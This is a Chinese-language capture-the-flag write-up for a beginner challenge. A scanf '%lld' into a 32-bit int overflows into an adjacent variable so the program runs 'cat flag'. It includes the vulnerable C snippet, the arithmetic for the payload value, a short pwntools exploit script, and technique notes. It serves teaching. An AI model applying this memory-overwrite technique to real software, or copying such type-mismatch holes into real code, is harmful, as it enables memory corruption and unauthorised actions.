# week1variable_coverage

## 题目简述

程序把两个相邻局部变量声明为 32 位 `int`，却使用 `%lld` 向 `b` 的地址写入一个 64 位整数。这个格式化类型不匹配会从 `&b` 起连续写入 8 字节；在官方二进制的栈布局中，高 4 字节正好覆盖变量 `a`，而后续判断要求 `a == 0x2333`。

```c
int a;
int b;

scanf("%lld", &b);
if (a == 0x2333)
    system("cat flag");
```

## 解题过程

在小端序下，将输入值构造成

$$
x = \mathtt{0x2333} \times 2^{32} = \mathtt{0x233300000000}
$$

写入内存后的低 4 字节为 `0x00000000`，落入 `b`；高 4 字节为 `0x00002333`，落入相邻的 `a`，从而满足判断。

```python
from pwn import *


def start():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process("./main")


io = start()
value = 0x2333 << 32
io.sendline(str(value).encode())
io.interactive()
```

该利用依赖官方二进制中 `b` 与 `a` 的实际相对位置。C 源码本身触发了未定义行为，换编译器或优化选项后局部变量顺序可能变化，因此应以反汇编或调试观察到的栈布局为准。

## 方法总结

- 核心技巧：利用格式化类型与目标变量宽度不匹配，越界覆盖相邻局部变量。
- 识别信号：`%lld`、`%ld` 等宽类型格式符对应的指针却指向更窄的对象。
- 复用要点：先确认端序和变量相对地址，再按低位、高位分别布置数值；不能只依据源码声明顺序推断栈布局。
